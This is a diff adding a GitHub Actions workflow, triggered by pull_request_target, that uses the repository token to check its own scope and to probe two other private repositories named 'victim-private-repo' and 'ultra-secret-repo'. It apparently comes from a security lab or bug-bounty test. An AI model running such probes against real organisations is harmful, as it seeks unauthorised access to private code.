@@ -1,0 +1,27 @@
+name: Token Scope Test
+on:
+  pull_request_target:
+    types: [opened, synchronize, edited]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      issues: write
+    steps:
+      - name: Check token scope
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "=== Token permissions ==="
+          curl -sf -H "Authorization: Bearer $GITHUB_TOKEN" \
+            https://api.github.com/repos/$GITHUB_REPOSITORY \
+            | jq '.permissions'
+          echo "=== Can this token access other org repos? ==="
+          curl -sf -H "Authorization: Bearer $GITHUB_TOKEN" \
+            https://api.github.com/repos/h1class/victim-private-repo \
+            | jq '{name: .name, private: .private, permissions: .permissions}' 2>/dev/null || echo "NO ACCESS"
+          echo "=== Can this token access ultra-secret-repo? ==="
+          curl -sf -H "Authorization: Bearer $GITHUB_TOKEN" \
+            https://api.github.com/repos/h1class/ultra-secret-repo \
+            | jq '{name: .name, private: .private}' 2>/dev/null || echo "NO ACCESS"
